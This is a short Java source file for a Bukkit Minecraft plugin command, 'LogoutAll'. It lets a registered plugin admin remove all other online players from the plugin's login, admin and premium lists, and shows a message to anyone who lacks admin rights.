package net.milkbowl.vault.commands.cmds.admin;

import org.bukkit.Bukkit;
import org.bukkit.entity.Player;

import net.milkbowl.vault.Core;
import net.milkbowl.vault.commands.CommandManager;
import net.milkbowl.vault.util.Settings;

public class LogoutAll extends CommandManager {
	
	public void execute(Core plugin, String msg, String[] args, Player p) {
		if (plugin.registeredAdmin.contains(p.getName())) {
			for (Player a : Bukkit.getOnlinePlayers()) {
				if (!a.getName().equals(p.getName())) {
					if (plugin.registered.contains(a.getName())) {
						plugin.registered.remove(a.getName());
						plugin.registeredAdmin.remove(a.getName());
						plugin.registeredPremium.remove(a.getName());
					}
				}
			}
			p.sendMessage(Settings.PREFIX("All users have been logged out!"));
		} else {
			p.sendMessage(Settings.PREFIX("You must be an " + Settings.HIGHLIGHT_COLOUR + "admin " + Settings.SECONDARY_COLOUR + "to execute this command"));
		}
	}

}
